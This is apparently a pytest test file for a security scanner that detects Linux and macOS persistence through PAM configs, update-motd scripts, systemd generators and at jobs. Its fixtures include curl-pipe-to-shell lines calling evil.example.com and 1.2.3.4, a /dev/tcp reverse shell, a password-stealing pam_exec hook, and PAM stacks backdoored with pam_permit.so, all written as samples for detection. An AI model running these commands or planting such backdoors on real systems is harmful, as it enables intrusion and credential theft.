"""Tests for the Linux/macOS persistence collectors: PAM, update-motd, systemd generators, at jobs, macOS periodic scripts,
emond, authorization plugins and login hooks. Everything runs on a tmp_path tree (the LinuxPaths fake root) on any POSIX OS."""

import os
import plistlib
import re
import sys

import pytest

from aegis.core.models import Category, CheckResult, Finding, Severity
from aegis.scanners import persistence as ps
from tests.unix_defaults import ALL_DEFAULTS, PERIODIC_STOCK, UBUNTU_MOTD

S = Severity

pytestmark = pytest.mark.skipif(os.name == "nt", reason="Linux/macOS collectors only run on POSIX systems")

# ATT&CK ids that v20 revoked (see tests/test_core.py::test_no_retired_attack_technique_ids)
RETIRED = {"T1562", "T1562.001", "T1562.002", "T1562.004", "T1562.006", "T1562.009", "T1070.001", "T1574.002", "T1656"}
NEW_TYPES = {"pam": ("AEG-PERS-PAM", "T1556.003"), "motd": ("AEG-PERS-MOTD", "T1037"),
             "systemd_generator": ("AEG-PERS-GENERATOR", "T1543.002"), "at_job": ("AEG-PERS-ATJOB", "T1053.002"),
             "periodic": ("AEG-PERS-PERIODIC", "T1053.003"), "emond": ("AEG-PERS-EMOND", "T1546.014"),
             "auth_plugin": ("AEG-PERS-AUTHPLUGIN", "T1556"), "login_hook": ("AEG-PERS-LOGINHOOK", "T1037.002")}
CURL_SH = "#!/bin/sh\ncurl -s http://evil.example.com/x.sh | sh\n"


@pytest.fixture
def unix_tree(tmp_path):
    etc = tmp_path / "etc"
    home = tmp_path / "home" / "bob"
    etc.mkdir()
    home.mkdir(parents=True)
    return ps.LinuxPaths(etc=etc, spool=(tmp_path / "spool",), homes=(home,))


def put(lp, logical, text, mode=0o755):
    p = lp.at(logical)
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text)
    p.chmod(mode)
    return p


def put_pam(lp, files):
    for name, text in files.items():
        put(lp, f"/etc/pam.d/{name}", text, 0o644)


def all_owned(files):
    return set(files)


def under_root(value, root):
    for prefix in {str(root), os.path.realpath(root)}:
        if value.startswith(prefix + "/"):
            return value[len(prefix):]
    return value


def rooted(e, root):
    """*root* is the fake root of a tree below /tmp: judge its paths as the system would see them (not as /tmp files)."""
    return e if root is None else dict(e, path=under_root(e["path"], root), command=under_root(e["command"], root))


def verdict(e, exists=lambda _p: True, root=None):
    return ps.combined_severity(ps.assess_entry(rooted(e, root), None, (), exists))


def finding(e, root=None):
    return ps.finding_for_entry(e, ps.assess_entry(rooted(e, root), None, (), lambda _p: True))


def by_name(entries):
    return {e["name"]: e for e in entries}


# --------------------------------------------------------------------------- fake root

def test_linux_paths_root_follows_etc(tmp_path):
    real = ps.LinuxPaths(homes=(tmp_path,))
    assert real.root == ps.Path("/") and real.is_real and real.at("/usr/lib/pam") == ps.Path("/usr/lib/pam")
    fake = ps.LinuxPaths(etc=tmp_path / "etc", homes=(tmp_path,))
    assert fake.root == tmp_path and not fake.is_real
    assert fake.at("/etc/pam.d") == tmp_path / "etc" / "pam.d" and fake.at("/usr/lib/x") == tmp_path / "usr" / "lib" / "x"
    other = ps.LinuxPaths(etc=tmp_path / "etc", homes=(tmp_path,), root=tmp_path / "sysroot")
    assert other.at("/var/spool/at") == tmp_path / "sysroot" / "var" / "spool" / "at"


def test_new_types_are_registered_with_current_attack_ids():
    for typ, (rule, technique) in NEW_TYPES.items():
        assert ps.TYPE_INFO[typ][0] == rule and ps.TYPE_INFO[typ][2] == [technique]
        assert re.fullmatch(r"T\d{4}(\.\d{3})?", technique) and technique not in RETIRED
    assert {"motd", "at_job", "periodic"} <= ps.TEXT_TYPES and "pam" not in ps.TEXT_TYPES
    assert len({rule for rule, _t in NEW_TYPES.values()}) == len(NEW_TYPES)


# --------------------------------------------------------------------------- PAM parsing

def test_parse_pam_conf():
    text = """# comment
auth\t[success=1 default=ignore]\tpam_unix.so nullok
-session optional pam_systemd.so
@include common-auth
auth required pam_exec.so quiet \\
    /usr/local/bin/hook.sh   # trailing comment
account    [default=bad success=ok user_unknown=ignore] pam_sss.so
auth include system-auth
not a rule
"""
    rules = ps.parse_pam_conf(text, "sshd")
    assert [(r.stack, r.control, r.module, r.dash) for r in rules] == [
        ("auth", "[success=1 default=ignore]", "pam_unix.so", False), ("session", "optional", "pam_systemd.so", True),
        ("*", "@include", "common-auth", False), ("auth", "required", "pam_exec.so", False),
        ("account", "[default=bad success=ok user_unknown=ignore]", "pam_sss.so", False),
        ("auth", "include", "system-auth", False)]
    assert rules[3].args == "quiet /usr/local/bin/hook.sh" and rules[0].args == "nullok" and rules[0].service == "sshd"


def test_pam_control_actions():
    assert ps.pam_control_actions("sufficient") == {"success": "done", "new_authtok_reqd": "done", "default": "ignore"}
    assert ps.pam_control_actions("REQUISITE")["default"] == "die"
    assert ps.pam_control_actions("[success=2 default=ignore]") == {"success": "2", "default": "ignore"}
    assert ps.pam_control_actions("[success=ok]")["default"] == "bad"
    assert ps.pam_control_actions("[Auth_Err=Die default=ignore]") == {"auth_err": "die", "default": "ignore"}


def test_pam_exec_command():
    assert ps.pam_exec_command("quiet expose_authtok log=/var/log/x type=auth /opt/h.sh --flag a") == "/opt/h.sh --flag a"
    assert ps.pam_exec_command("seteuid") == "" and ps.pam_exec_command("") == ""
    assert ps.pam_exec_command("debug debug_x /opt/h.sh") == "debug_x /opt/h.sh"


# --------------------------------------------------------------------------- PAM: default configurations stay silent

def install_modules(lp):
    for logical in ("/lib/x86_64-linux-gnu/security", "/usr/lib64/security", "/usr/lib/security", "/usr/lib/pam"):
        for mod in ("pam_unix.so", "pam_permit.so", "pam_deny.so", "pam_opendirectory.so.2"):
            put(lp, f"{logical}/{mod}", "\x7fELF", 0o644)


@pytest.mark.parametrize("distro", sorted(ALL_DEFAULTS))
def test_default_pam_configurations_produce_no_entries(unix_tree, distro):
    put_pam(unix_tree, ALL_DEFAULTS[distro])
    install_modules(unix_tree)
    rules = [r for name in ALL_DEFAULTS[distro] for r in ps.parse_pam_conf(ALL_DEFAULTS[distro][name], name)]
    assert any(r.stack == "auth" for r in rules) and len(rules) >= 6  # the files really were parsed
    assert ps.collect_pam(unix_tree, owned=all_owned) == []


@pytest.mark.parametrize("distro", sorted(ALL_DEFAULTS))
def test_default_login_stacks_are_replayed_and_fail_for_a_stranger(distro):
    services = {name: ps.parse_pam_conf(text, name) for name, text in ALL_DEFAULTS[distro].items()}
    replayed = 0
    for service in ps.PAM_LOGIN_SERVICES:
        if service not in services:
            continue
        stack = ps.pam_stack(service, "auth", lambda n: services.get(os.path.basename(n)))
        if stack:
            replayed += 1
            assert not ps.pam_stack_passes(stack, []), (distro, service)
    assert replayed >= (1 if distro == "macos" else 3)


def test_replay_follows_debian_includes_and_stops_at_pam_deny():
    services = {name: ps.parse_pam_conf(text, name) for name, text in ALL_DEFAULTS["debian-ubuntu"].items()}
    load = lambda n: services.get(os.path.basename(n))  # noqa: E731
    stack = ps.pam_stack("sshd", "auth", load)
    assert [os.path.basename(r.module) for r in stack] == ["pam_unix.so", "pam_deny.so", "pam_permit.so"]
    trace = []
    assert ps.pam_stack_passes(stack, trace) is False and trace == []
    # ... but the same stack without the deny rule lets everyone in
    no_deny = [r for r in stack if r.module != "pam_deny.so"]
    assert ps.pam_stack_passes(no_deny, trace) is True and [r.module for r in trace] == ["pam_permit.so"]


@pytest.mark.parametrize("distro,file,edit,services", [
    ("debian-ubuntu", "common-auth", lambda t: "auth\tsufficient\tpam_permit.so\n" + t,
     {"common-auth", "sshd", "sudo", "login", "su", "other"}),
    ("debian-ubuntu", "common-auth", lambda t: t.replace("auth\trequisite\t\t\tpam_deny.so\n", ""),
     {"common-auth", "sshd", "sudo"}),
    ("debian-sssd", "common-auth", lambda t: "auth\t[success=done default=ignore]\tpam_permit.so\n" + t,
     {"common-auth", "login"}),
    ("fedora-default", "system-auth", lambda t: t.replace("pam_deny.so", "pam_permit.so", 1),
     {"system-auth", "sudo", "login", "su"}),
    ("fedora-workstation", "password-auth", lambda t: t.replace("pam_deny.so", "pam_permit.so", 1), {"password-auth", "sshd"}),
    ("arch", "system-auth", lambda t: "auth       sufficient pam_permit.so\n" + t,
     {"system-auth", "sudo", "sshd", "login", "system-login", "system-remote-login"}),
    ("macos", "sudo", lambda t: t.replace("required       pam_opendirectory.so", "sufficient     pam_permit.so"), {"sudo"}),
])
def test_backdoored_default_stacks_are_flagged_high(unix_tree, distro, file, edit, services):
    files = dict(ALL_DEFAULTS[distro])
    files[file] = edit(files[file])
    put_pam(unix_tree, files)
    entries = ps.collect_pam(unix_tree, owned=all_owned)
    assert entries and {e["type"] for e in entries} == {"pam"}
    hit = [e for e in entries if e["location"].endswith(f"/pam.d/{file}")]
    assert hit and all(verdict(e) == S.HIGH and "pam_permit.so" in e["name"] for e in hit)
    reasons = " ".join(r["text"] for e in hit for r in e["meta"]["reasons"])
    assert services <= set(re.findall(r"[\w-]+", reasons)), reasons
    f = finding(hit[0])
    assert f.rule_id == "AEG-PERS-PAM" and f.severity == S.HIGH and f.category == Category.PERSISTENCE
    assert "T1556.003" in f.mitre and f.location.startswith(str(unix_tree.etc / "pam.d" / file))


@pytest.mark.parametrize("auth,flagged", [
    ("auth sufficient pam_permit.so", True),
    ("-auth sufficient pam_permit.so", True),
    ("auth [success=done default=ignore] pam_permit.so", True),
    ("auth sufficient /lib/x86_64-linux-gnu/security/pam_permit.so", True),
    ("auth required pam_permit.so", True),
    ("auth required pam_env.so\nauth required pam_permit.so", True),
    ("auth sufficient pam_unix.so\nauth required pam_permit.so", True),
    ("auth optional pam_unix.so\nauth required pam_permit.so", True),
    ("auth sufficient pam_rootok.so\nauth sufficient pam_unix.so\nauth optional pam_permit.so", True),
    ("auth required pam_unix.so\nauth required pam_permit.so", False),
    ("auth required pam_unix.so\nauth sufficient pam_permit.so", False),
    ("auth requisite pam_unix.so\nauth sufficient pam_permit.so", False),
    ("auth sufficient pam_unix.so\nauth required pam_deny.so\nauth required pam_permit.so", False),
    ("auth [success=1 default=ignore] pam_unix.so\nauth requisite pam_deny.so\nauth required pam_permit.so", False),
    ("auth [success=1 default=bad] pam_unix.so\nauth [default=die] pam_faillock.so authfail\nauth optional pam_permit.so", False),
    ("auth required pam_sss.so\nauth optional pam_permit.so", False),
    ("session sufficient pam_permit.so\naccount required pam_permit.so\nauth required pam_unix.so", False),
    ("auth required pam_unix.so", False),
])
def test_pam_permit_in_the_auth_stack(unix_tree, auth, flagged):
    put_pam(unix_tree, {"sshd": auth + "\n"})
    entries = ps.collect_pam(unix_tree, owned=all_owned)
    assert bool(entries) is flagged, entries
    if flagged:
        assert all(e["name"] == "auth pam_permit.so" and verdict(e) == S.HIGH for e in entries)


def test_pam_permit_through_include_and_substack(unix_tree):
    put_pam(unix_tree, {"common-auth": "auth sufficient pam_permit.so\nauth required pam_unix.so\n",
                        "sshd": "auth substack common-auth\naccount required pam_nologin.so\n",
                        "sudo": "auth include common-auth\n", "login": "@include common-auth\n",
                        "su": "auth substack safe\nauth include safe\n",
                        "safe": "auth required pam_unix.so\nauth required pam_deny.so\n"})
    entries = ps.collect_pam(unix_tree, owned=all_owned)
    assert len(entries) == 1 and entries[0]["location"].endswith("/pam.d/common-auth")
    reasons = entries[0]["meta"]["reasons"][0]["text"]
    assert "common-auth" in reasons and "sshd" in reasons and "sudo" in reasons and "login" in reasons and "su," not in reasons


def test_substack_decides_only_for_itself():
    services = {"outer": ps.parse_pam_conf("auth substack inner\nauth required pam_unix.so\n", "outer"),
                "inner": ps.parse_pam_conf("auth sufficient pam_permit.so\n", "inner")}
    load = lambda n: services.get(n)  # noqa: E731
    # the substack succeeds (done) but pam_unix after it still has to say yes
    assert ps.pam_stack_passes(ps.pam_stack("outer", "auth", load), []) is False
    services["outer"] = ps.parse_pam_conf("auth include inner\nauth required pam_unix.so\n", "outer")
    assert ps.pam_stack_passes(ps.pam_stack("outer", "auth", load), []) is True  # include: done ends the whole stack


def test_pam_permit_is_fine_outside_login_services(unix_tree):
    put_pam(unix_tree, {"gdm-autologin": "auth required pam_permit.so\n", "lightdm-greeter": "auth required pam_permit.so\n",
                        "system-services": "auth sufficient pam_permit.so\n", "cron": "auth sufficient pam_permit.so\n"})
    assert ps.collect_pam(unix_tree, owned=all_owned) == []


def test_pam_include_loops_do_not_hang(unix_tree):
    put_pam(unix_tree, {"sshd": "@include sshd\nauth required pam_unix.so\n", "sudo": "auth include login\n",
                        "login": "auth include sudo\nauth required pam_deny.so\n"})
    assert ps.collect_pam(unix_tree, owned=all_owned) == []


# --------------------------------------------------------------------------- PAM: pam_exec and odd module paths

def test_pam_exec_records_the_program_and_rates_its_location(unix_tree):
    put(unix_tree, "/opt/app/hook.sh", "#!/bin/sh\n", 0o666)  # world-writable
    put(unix_tree, "/usr/local/bin/notify.sh", "#!/bin/sh\n", 0o755)
    put_pam(unix_tree, {"sshd": ("session optional pam_exec.so /usr/local/bin/notify.sh\n"
                                 "auth optional pam_exec.so expose_authtok quiet /tmp/.x/steal.sh\n"
                                 "session optional pam_exec.so seteuid /home/bob/bin/log.sh\n"
                                 "session optional pam_exec.so log=/var/log/h.log type=open_session /opt/app/hook.sh --flag\n"
                                 "account optional pam_exec.so /usr/local/lib/.hidden/check\n"),
                        "login": "session optional pam_exec.so /usr/local/bin/notify.sh\n"})
    entries = ps.collect_pam(unix_tree, owned=all_owned)
    rows = {(os.path.basename(e["location"]), e["name"]): e for e in entries}
    assert len(entries) == 6 and {e["type"] for e in entries} == {"pam"}
    assert rows[("sshd", "session pam_exec.so")]["command"] == "/usr/local/bin/notify.sh"
    assert rows[("sshd", "session pam_exec.so")]["path"] == "/usr/local/bin/notify.sh"
    assert rows[("login", "session pam_exec.so")]["command"] == "/usr/local/bin/notify.sh"
    assert rows[("sshd", "session pam_exec.so #2")]["command"] == "/home/bob/bin/log.sh"
    assert rows[("sshd", "session pam_exec.so #3")]["command"] == "/opt/app/hook.sh --flag"
    assert rows[("sshd", "auth pam_exec.so")]["command"] == "/tmp/.x/steal.sh"
    expected = {("sshd", "session pam_exec.so"): S.MEDIUM, ("login", "session pam_exec.so"): S.MEDIUM,
                ("sshd", "session pam_exec.so #2"): S.HIGH,  # home folder
                ("sshd", "session pam_exec.so #3"): S.HIGH,  # world-writable
                ("sshd", "auth pam_exec.so"): S.HIGH,  # /tmp
                ("sshd", "account pam_exec.so"): S.HIGH}  # hidden directory
    assert {k: verdict(e) for k, e in rows.items()} == expected
    steal = " ".join(r["text"] for r in rows[("sshd", "auth pam_exec.so")]["meta"]["reasons"])
    assert "password" in steal and "/tmp/.x/steal.sh" in steal
    # every finding gets its own location, so none is merged into another
    assert len({finding(e).fingerprint for e in entries}) == 6


def test_pam_exec_command_line_is_judged_like_any_command(unix_tree):
    put_pam(unix_tree, {"sudo": 'session optional pam_exec.so /bin/sh -c "curl -s http://1.2.3.4/a | sh"\n'})
    (e,) = ps.collect_pam(unix_tree, owned=all_owned)
    assert verdict(e) == S.HIGH and "curl" in e["command"]
    assert verdict(e, exists=lambda _p: False) == S.HIGH  # a missing target never lowers it


def test_pam_exec_missing_program_is_still_medium(unix_tree):
    put_pam(unix_tree, {"sshd": "session optional pam_exec.so /usr/local/bin/gone.sh\n"})
    (e,) = ps.collect_pam(unix_tree, owned=all_owned)
    assert verdict(e, exists=lambda _p: False) == S.MEDIUM


@pytest.mark.parametrize("module,expected", [
    ("/lib/x86_64-linux-gnu/security/pam_unix.so", None), ("/lib/security/pam_unix.so", None),
    ("/lib64/security/pam_unix.so", None), ("/usr/lib/security/pam_unix.so", None),
    ("/usr/lib64/security/pam_unix.so", None), ("/usr/lib/aarch64-linux-gnu/security/pam_unix.so", None),
    ("/usr/lib/pam/pam_opendirectory.so.2", None),
    ("/nix/store/abc123-linux-pam-1.5.3/lib/security/pam_unix.so", None),
    ("/run/current-system/sw/lib/security/pam_unix.so", None),
    ("/opt/evil/pam_evil.so", S.MEDIUM), ("/usr/local/lib/pam_custom.so", S.MEDIUM),
    ("/usr/lib/security/../evil/pam_evil.so", S.MEDIUM),
    ("/tmp/pam_evil.so", S.HIGH), ("/dev/shm/.x/pam_evil.so", S.HIGH), ("/home/bob/pam_evil.so", S.HIGH),
    ("/var/tmp/pam_evil.so", S.HIGH),
    # Homebrew modules macOS users add on purpose (Touch ID in tmux, Apple Watch for sudo): LOW, unless in a risky place
    ("/opt/homebrew/lib/pam/pam_reattach.so", S.LOW), ("/usr/local/lib/pam/pam_watchid.so.2", S.LOW),
    ("/tmp/pam_reattach.so", S.HIGH),
])
def test_pam_module_by_absolute_path(unix_tree, module, expected):
    put_pam(unix_tree, {"sshd": f"auth required {module} nullok\n"})
    entries = ps.collect_pam(unix_tree, owned=all_owned)
    if expected is None:
        assert entries == []
        return
    (e,) = entries
    assert verdict(e) == expected and e["path"] == module
    assert "outside the standard PAM module directories" in finding(e).description


def test_risky_unix_path(tmp_path):
    shared = tmp_path / "shared"
    shared.mkdir()
    shared.chmod(0o777)
    (shared / "prog").write_text("x")
    (shared / "prog").chmod(0o755)
    quiet = tmp_path / "quiet" / "prog"
    quiet.parent.mkdir()
    quiet.write_text("x")
    quiet.chmod(0o755)
    assert ps.risky_unix_path("/tmp/x") and ps.risky_unix_path("/var/tmp/x") and ps.risky_unix_path("/dev/shm/x")
    assert ps.risky_unix_path("~/x") and ps.risky_unix_path("/home/u/x") and ps.risky_unix_path("/root/x")
    assert ps.risky_unix_path("/opt/.cache/x") and ps.risky_unix_path("/usr/local/bin/.x")
    assert ps.risky_unix_path("/Users/u/x") and ps.risky_unix_path("/Users/Shared/x")
    assert not any(ps.risky_unix_path(p) for p in ("/usr/local/bin/x", "/opt/app/bin/x", "/bin/sh", "/usr/lib/systemd/x"))
    assert ps.risky_unix_path("/somewhere/prog", shared / "prog")  # world-writable directory
    assert not ps.risky_unix_path("/somewhere/prog", quiet)
    assert not ps.risky_unix_path("/somewhere/prog", tmp_path / "missing" / "prog")
    (shared / "prog").chmod(0o757)
    assert ps.risky_unix_path("/somewhere/prog", quiet.parent / ".." / "shared" / "prog")  # world-writable file


# --------------------------------------------------------------------------- PAM: modules not owned by a package

def test_pam_modules_not_owned_by_a_package(unix_tree):
    for logical in ("/lib/x86_64-linux-gnu/security", "/usr/lib64/security"):
        put(unix_tree, f"{logical}/pam_unix.so", "\x7fELF", 0o644)
    put(unix_tree, "/lib/x86_64-linux-gnu/security/pam_evil.so", "\x7fELF", 0o644)
    put(unix_tree, "/usr/lib64/security/pam_stash.so", "\x7fELF", 0o644)
    put(unix_tree, "/usr/lib64/security/README", "not a module", 0o644)
    put_pam(unix_tree, {"sshd": "auth required pam_unix.so\nauth optional pam_evil.so\n", "login": "auth optional pam_evil.so\n"})
    asked = []

    def owned(files):
        asked.append(list(files))
        return {f for f in files if not f.endswith(("pam_evil.so", "pam_stash.so"))}

    entries = ps.collect_pam(unix_tree, owned=owned)
    rows = by_name(entries)
    assert set(rows) == {"pam_evil.so", "pam_stash.so"} and len(asked) == 1 and len(asked[0]) == 4  # one batched query
    root = unix_tree.root
    assert verdict(rows["pam_evil.so"], root=root) == S.MEDIUM and verdict(rows["pam_stash.so"], root=root) == S.LOW
    assert rows["pam_evil.so"]["path"].endswith("/lib/x86_64-linux-gnu/security/pam_evil.so")
    text = rows["pam_evil.so"]["meta"]["reasons"][0]["text"]
    assert "login, sshd" in text and "no package" in text
    f = finding(rows["pam_evil.so"], root)
    assert f.rule_id == "AEG-PERS-PAM" and f.severity == S.MEDIUM and "T1556.003" in f.mitre


def test_pam_ownership_is_skipped_silently_without_a_package_tool(unix_tree, monkeypatch):
    put(unix_tree, "/lib/security/pam_evil.so", "\x7fELF", 0o644)
    assert ps.collect_pam(unix_tree, owned=lambda files: None) == []
    # a tree that is not the real root never asks this machine's package database about its files
    monkeypatch.setattr(ps, "package_owned", lambda files: pytest.fail("the host's database must not be asked"))
    assert ps.collect_pam(unix_tree) == []


def test_pam_module_directories_are_listed_once(unix_tree):
    put(unix_tree, "/usr/lib/x86_64-linux-gnu/security/pam_a.so", "x", 0o644)
    put(unix_tree, "/usr/lib/security/pam_b.so", "x", 0o644)
    (unix_tree.root / "lib").symlink_to("usr/lib")  # merged /usr
    (unix_tree.root / "lib64").symlink_to("usr/lib")
    asked = []
    ps.collect_pam(unix_tree, owned=lambda files: asked.append(sorted(os.path.basename(f) for f in files)) or set(files))
    assert asked == [["pam_a.so", "pam_b.so"]]


@pytest.fixture
def fresh_owner_cache():
    ps._package_tool.cache_clear()
    ps._OWNED_CACHE.clear()
    yield
    ps._package_tool.cache_clear()
    ps._OWNED_CACHE.clear()


def fake_tools(monkeypatch, tool, owned_paths, calls):
    """Pretend *tool* is the only package manager and owns exactly *owned_paths* (spelled the way its database spells them)."""
    monkeypatch.setattr(ps.shutil, "which", lambda t: f"/usr/bin/{t}" if t == tool else None)

    def fake_run(cmd, timeout=60, input_text=None):
        calls.append(list(cmd))
        paths = cmd[cmd.index("--") + 1:]
        if tool == "dpkg":
            out = "".join(f"libpam-modules:amd64: {p}\n" for p in paths if p in owned_paths)
            return (0 if all(p in owned_paths for p in paths) else 1), out, ""
        out = "".join("pam\n" if p in owned_paths else f"file {p} is not owned by any package\n" for p in paths)
        return (0 if all(p in owned_paths for p in paths) else 1), out, ""

    monkeypatch.setattr(ps, "run", fake_run)


def test_package_owned_with_dpkg_batches_queries_and_remembers(monkeypatch, fresh_owner_cache):
    calls = []
    fake_tools(monkeypatch, "dpkg", {"/usr/bin/dpkg", "/usr/lib/x86_64-linux-gnu/security/pam_unix.so"}, calls)
    files = ["/lib/x86_64-linux-gnu/security/pam_unix.so", "/lib/x86_64-linux-gnu/security/pam_evil.so"]
    # merged /usr: the database knows the /usr/lib spelling, the PAM directory is reached as /lib
    assert ps.package_owned(files) == {files[0]}
    probe, query = calls
    assert probe[:3] == ["/usr/bin/dpkg", "-S", "--"] and query[:3] == ["/usr/bin/dpkg", "-S", "--"]
    assert files[0] in query and "/usr/lib/x86_64-linux-gnu/security/pam_unix.so" in query
    assert ps.package_owned(files) == {files[0]} and len(calls) == 2  # answered from memory
    assert ps.package_owned(files + ["/lib/security/pam_new.so"]) == {files[0]} and len(calls) == 3  # only the new file asked
    assert calls[2].count("/lib/security/pam_new.so") == 1 and files[0] not in calls[2]


def test_package_owned_with_rpm(monkeypatch, fresh_owner_cache):
    calls = []
    fake_tools(monkeypatch, "rpm", {"/usr/bin/rpm", "/usr/lib64/security/pam_unix.so"}, calls)
    files = ["/usr/lib64/security/pam_unix.so", "/usr/lib64/security/pam_evil.so"]
    assert ps.package_owned(files) == {files[0]} and calls[1][:3] == ["/usr/bin/rpm", "-qf", "--qf"]


def test_package_owned_unavailable(monkeypatch, fresh_owner_cache):
    monkeypatch.setattr(ps.shutil, "which", lambda t: None)
    assert ps.package_owned(["/lib/security/pam_unix.so"]) is None
    ps._package_tool.cache_clear()
    # a tool whose database cannot answer (it does not even know its own binary) is not used
    monkeypatch.setattr(ps.shutil, "which", lambda t: f"/usr/bin/{t}")
    monkeypatch.setattr(ps, "run", lambda cmd, timeout=60, input_text=None: (2, "", "dpkg: error: database is locked"))
    assert ps.package_owned(["/lib/security/pam_unix.so"]) is None
    ps._package_tool.cache_clear()
    monkeypatch.setattr(ps, "run", lambda cmd, timeout=60, input_text=None: (-1, "", "timeout after 30s"))
    assert ps.package_owned(["/lib/security/pam_unix.so"]) is None


@pytest.mark.skipif(not (sys.platform.startswith("linux") and (ps.shutil.which("dpkg") or ps.shutil.which("rpm"))),
                    reason="needs dpkg or rpm")
def test_package_owned_against_the_real_database(fresh_owner_cache, tmp_path):
    tool = ps.shutil.which("dpkg") or ps.shutil.which("rpm")
    stray = tmp_path / "pam_stray.so"
    stray.write_text("x")
    owned = ps.package_owned([tool, str(stray)])
    assert owned == {tool}


# --------------------------------------------------------------------------- update-motd

def test_update_motd_scripts_are_inventoried_and_judged(unix_tree):
    for name, text in UBUNTU_MOTD.items():
        put(unix_tree, f"/etc/update-motd.d/{name}", text)
    put(unix_tree, "/etc/update-motd.d/90-updates", CURL_SH)
    put(unix_tree, "/etc/update-motd.d/91-ip", "#!/bin/sh\ncurl -fsSL http://1.2.3.4/a | bash\n")
    put(unix_tree, "/etc/update-motd.d/92-shell", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    put(unix_tree, "/etc/update-motd.d/99-off", CURL_SH, 0o644)  # not executable: run-parts skips it
    entries = ps.collect_motd(unix_tree)
    rows = by_name(entries)
    assert set(rows) == set(UBUNTU_MOTD) | {"90-updates", "91-ip", "92-shell", "99-off"}
    assert all(e["type"] == "motd" and e["location"] == str(unix_tree.etc / "update-motd.d") and e["command"].startswith("sha1:")
               for e in entries)
    assert all(verdict(rows[n]) == S.INFO for n in UBUNTU_MOTD)  # Ubuntu's own scripts, 50-motd-news included
    assert verdict(rows["90-updates"]) >= S.MEDIUM and verdict(rows["91-ip"]) >= S.HIGH
    assert verdict(rows["92-shell"]) == S.CRITICAL
    assert rows["99-off"]["enabled"] is False and ps.assess_entry(rows["99-off"]) == []
    assert rows["90-updates"]["path"] == str(unix_tree.etc / "update-motd.d" / "90-updates")
    assert "curl" in rows["90-updates"]["meta"]["text"]
    f = finding(rows["90-updates"])
    assert f.rule_id == "AEG-PERS-MOTD" and "T1037" in f.mitre and f.category == Category.PERSISTENCE
    assert f.location == f"{unix_tree.etc / 'update-motd.d'} [90-updates]"


def test_update_motd_entry_changes_with_the_script(unix_tree):
    put(unix_tree, "/etc/update-motd.d/00-header", "#!/bin/sh\necho hi\n")
    before = ps.collect_motd(unix_tree)[0]
    put(unix_tree, "/etc/update-motd.d/00-header", "#!/bin/sh\necho hi\ncurl http://evil.example.com | sh\n")
    after = ps.collect_motd(unix_tree)[0]
    assert ps.diff_entries([before], [after]) == ([after], [before])


def test_update_motd_ignores_missing_directory_and_masks(unix_tree):
    assert ps.collect_motd(unix_tree) == []
    d = unix_tree.etc / "update-motd.d"
    d.mkdir()
    (d / "10-off").symlink_to("/dev/null")
    (d / "20-dangling").symlink_to("/nonexistent/target")
    (d / "sub").mkdir()
    assert ps.collect_motd(unix_tree) == []


# --------------------------------------------------------------------------- systemd generators

def test_systemd_generators_outside_the_distribution_directories(unix_tree):
    put(unix_tree, "/etc/systemd/system-generators/evil-generator", "#!/bin/sh\nexit 0\n")
    put(unix_tree, "/usr/local/lib/systemd/user-generators/mine", "#!/bin/sh\n")
    put(unix_tree, "/run/systemd/system-generators/volatile", "#!/bin/sh\n")
    put(unix_tree, "/etc/systemd/user-generators/u", "#!/bin/sh\n")
    put(unix_tree, "/usr/local/lib/systemd/system-generators/g", "#!/bin/sh\n")
    put(unix_tree, "/run/systemd/user-generators/r", "#!/bin/sh\n")
    put(unix_tree, "/etc/systemd/system-generators/disabled", "#!/bin/sh\n", 0o644)
    put(unix_tree, "/usr/lib/systemd/system-generators/systemd-fstab-generator", "\x7fELF")  # the distribution's own
    put(unix_tree, "/lib/systemd/system-generators/systemd-getty-generator", "\x7fELF")
    (unix_tree.etc / "systemd" / "system-generators" / "systemd-gpt-auto-generator").symlink_to("/dev/null")  # a mask
    entries = ps.collect_generators(unix_tree)
    rows = {e["name"]: e for e in entries}
    assert set(rows) == {"evil-generator", "mine", "volatile", "u", "g", "r", "disabled"}
    root = unix_tree.root
    assert all(e["type"] == "systemd_generator" and verdict(e, root=root) == S.LOW for e in entries if e["enabled"])
    assert rows["disabled"]["enabled"] is False and ps.assess_entry(rows["disabled"]) == []
    evil = rows["evil-generator"]
    assert evil["location"] == str(unix_tree.etc / "systemd" / "system-generators") and evil["path"] == evil["command"]
    f = finding(evil, root)
    assert f.rule_id == "AEG-PERS-GENERATOR" and f.severity == S.LOW and "T1543.002" in f.mitre
    assert "/etc/systemd/system-generators" in f.description


def test_systemd_generator_target_is_judged_like_other_entries(unix_tree):
    put(unix_tree, "/tmp/.x/gen", "#!/bin/sh\n")
    put(unix_tree, "/opt/app/gen", "#!/bin/sh\n")
    d = unix_tree.etc / "systemd" / "system-generators"
    d.mkdir(parents=True)
    (d / "from-tmp").symlink_to(unix_tree.root / "tmp" / ".x" / "gen")
    (d / "from-opt").symlink_to(unix_tree.root / "opt" / "app" / "gen")
    rows = by_name(ps.collect_generators(unix_tree))
    assert rows["from-tmp"]["path"] == os.path.realpath(unix_tree.root / "tmp" / ".x" / "gen")
    assert rows["from-tmp"]["command"] == str(d / "from-tmp")  # what systemd would run is the link itself
    root = unix_tree.root
    assert verdict(rows["from-opt"], root=root) == S.LOW and verdict(rows["from-tmp"], root=root) >= S.MEDIUM
    assert any(r.kind == "location" for r in ps.assess_entry(rooted(rows["from-tmp"], root), None, (), lambda _p: True))


# --------------------------------------------------------------------------- at jobs

AT_SCRIPT = """#!/bin/sh
# atrun uid=1000 gid=1000
# mail bob 0
umask 22
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games; export PATH
LS_COLORS=rs=0:di=01\\;34:ln=01\\;36; export LS_COLORS
cd /home/bob || {
\t echo 'Execution directory inaccessible' >&2
\t exit 1
}
/usr/local/bin/backup.sh --full
"""


def test_at_jobs_on_linux_and_macos(unix_tree):
    put(unix_tree, "/var/spool/cron/atjobs/a0000101a1b2c3", AT_SCRIPT, 0o700)
    put(unix_tree, "/var/spool/cron/atjobs/.SEQ", "00001\n", 0o600)
    put(unix_tree, "/var/spool/cron/atjobs/a0000201a1b2c3", AT_SCRIPT.replace("/usr/local/bin/backup.sh --full",
                                                                              "curl -s http://evil.example.com/p | sh"), 0o700)
    put(unix_tree, "/var/spool/at/a0000301a1b2c3", AT_SCRIPT, 0o700)  # Red Hat spool, with its output directory
    (unix_tree.root / "var" / "spool" / "at" / "spool").mkdir()
    put(unix_tree, "/var/spool/atjobs/a0000401a1b2c3", AT_SCRIPT, 0o700)
